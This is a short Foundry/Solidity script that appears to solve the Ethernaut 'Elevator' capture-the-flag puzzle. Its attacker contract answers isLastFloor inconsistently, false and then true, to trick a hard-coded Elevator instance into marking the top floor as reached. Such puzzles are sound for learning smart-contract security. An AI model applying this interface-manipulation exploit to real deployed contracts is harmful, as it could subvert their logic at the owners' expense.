// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator, Building} from "../src/Elevator.sol";
import {Script} from "forge-std/Script.sol";

contract MyBuilding {
    Elevator public elevator = Elevator(0xd760f58479DBE0F34783EBc7E5c361303ab0edD3);
    bool private MySwitch;

    function attack() external {
        elevator.goTo(99999999);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!MySwitch) {
            MySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract ElevatorSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.attack();
        vm.stopBroadcast();
    }
}
